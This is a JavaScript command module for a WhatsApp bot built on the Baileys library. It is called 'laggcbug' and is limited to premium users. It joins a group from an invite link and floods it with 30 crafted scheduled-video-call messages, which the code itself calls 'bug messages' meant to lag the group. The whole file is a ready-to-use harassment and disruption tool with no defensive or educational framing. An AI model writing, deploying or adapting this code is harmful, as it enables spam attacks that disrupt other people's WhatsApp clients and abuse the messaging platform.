const moment = require('moment-timezone');
const { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { isPremium } = require('../lib/premium.js');

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = {
  name: 'laggcbug',
  description: 'Join group and spam scheduled call invites (premium only)',
  run: async (m, { conn, prefix, command, args }) => {
    const senderId = (m.key.participant || m.key.remoteJid || '').split(':')[0];

    if (!isPremium(senderId)) {
      return conn.sendMessage(m.key.remoteJid, { text: '🚫 This command is for premium users only.' }, { quoted: m });
    }

    if (!args[0]) {
      return conn.sendMessage(m.key.remoteJid, {
        text: `❌ Usage: ${prefix + command} <group_invite_link>\nExample: ${prefix + command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`
      }, { quoted: m });
    }

    try {
      // Extract the invite code from the link
      const inviteCode = args[0].split('https://chat.whatsapp.com/')[1];
      if (!inviteCode) {
        return conn.sendMessage(m.key.remoteJid, { text: '❌ Invalid WhatsApp group invite link.' }, { quoted: m });
      }

      // Join the group
      const groupJid = await conn.groupAcceptInvite(inviteCode);

      const amount = 30; // number of spam messages
      const bugTitle = 'Lag Bug Scheduled Call'; // customize your spam message title here

      for (let i = 0; i < amount; i++) {
        const scheduledCallMessage = generateWAMessageFromContent(
          groupJid,
          proto.Message.fromObject({
            scheduledCallCreationMessage: {
              callType: 2, // video call type
              scheduledTimestampMs: Date.now() + i * 1000, // stagger the timestamps slightly
              title: bugTitle,
            }
          }),
          { userJid: groupJid, quoted: m }
        );

        await conn.relayMessage(groupJid, scheduledCallMessage.message, { messageId: scheduledCallMessage.key.id });
        await sleep(3000); // wait 3 seconds between each message
      }

      return conn.sendMessage(m.key.remoteJid, {
        text: `✅ Successfully sent bug messages to group ${groupJid}. Please pause for 3 minutes before using again.`
      }, { quoted: m });

    } catch (error) {
      console.error(error);
      return conn.sendMessage(m.key.remoteJid, {
        text: '❌ Failed to join the group or send bug messages. Check the invite link and try again.'
      }, { quoted: m });
    }
  }
};
